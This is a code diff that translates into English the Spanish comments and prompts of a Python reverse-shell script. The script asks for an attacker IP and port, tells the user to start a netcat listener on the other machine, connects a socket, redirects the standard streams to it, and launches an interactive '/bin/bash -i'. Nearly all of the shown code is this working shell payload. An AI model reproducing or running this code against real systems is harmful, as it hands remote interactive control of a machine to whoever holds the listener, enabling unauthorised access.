@@ -4,32 +4,32 @@ from os import dup2
 from subprocess import run
 import socket
 
-# Función para imprimir con color
+# Function to print with color
 def print_color(message, color_code):
     print("\033[" + str(color_code) + "m" + message + "\033[0m")
 
-# Agregar espacios para mayor claridad
+# Add spaces for clarity
 print_color("", 94)
 print_color("_________________________________________________________", 94)
 print_color("", 94)
 
-# Mensaje
-print_color("Ejecutar nc nvlp 1234 en la otra máquina", 95)
+# Message
+print_color("Run nc nvlp 1234 on the other machine", 95)
 
-# Preguntar por la IP
-ip = input("\033[93mIngresa la dirección IP: \033[0m")
+# Ask for the IP
+ip = input("\033[93mEnter the IP address: \033[0m")
 
-# Preguntar por el puerto
+# Ask for the port
 default_port = 1234
-port_input = input("\033[93m¿Puerto por defecto 1234? [c] para cambiar: \033[0m")
+port_input = input("\033[93mDefault port 1234? [c] to change: \033[0m")
 if port_input.lower() == 'c':
-    port = int(input("\033[93mIngresa el puerto: \033[0m"))
+    port = int(input("\033[93mEnter the port: \033[0m"))
 else:
     port = default_port
 
-# Confirmar antes de ejecutar
-ejecutar = input(f"\033[92m¿Ejecutar conexión a {ip} en el puerto {port}? [S/n']: \033[0m").strip().lower()
-if ejecutar in ['', 's']:
+# Confirm before executing
+execute = input(f"\033[92mExecute connection to {ip} on port {port}? [Y/n']: \033[0m").strip().lower()
+if execute in ['', 'y']:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((ip, port))
@@ -38,6 +38,6 @@ if ejecutar in ['', 's']:
         dup2(s.fileno(), 2)
         run(["/bin/bash", "-i"])
     except Exception as e:
-        print_color(f"Error al conectar: {e}", 91)
+        print_color(f"Error connecting: {e}", 91)
 else:
-    print_color("Operación cancelada.", 91)
+    print_color("Operation cancelled.", 91)
